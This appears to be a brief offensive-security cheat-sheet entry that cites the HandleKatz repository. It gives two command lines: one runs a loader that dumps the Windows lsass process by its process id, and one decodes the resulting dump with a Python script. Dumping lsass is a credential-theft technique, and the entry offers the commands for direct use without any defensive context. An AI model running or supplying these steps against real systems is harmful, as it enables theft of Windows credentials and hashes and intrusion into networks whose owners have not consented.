### Source
https://github.com/codewhitesec/HandleKatz  

### Dump lsass process using ReactOS MiniDumpWriteDumpA as Position Independent Code
```
loader.exe --pid:&lt;pid&gt; --outfile:&lt;outfile&gt;.dmp
```

### Decode resulting dump
```
python3 Decoder.py -input &lt;lsassDump&gt;.dmp -output &lt;outfile&gt;.dmp
```


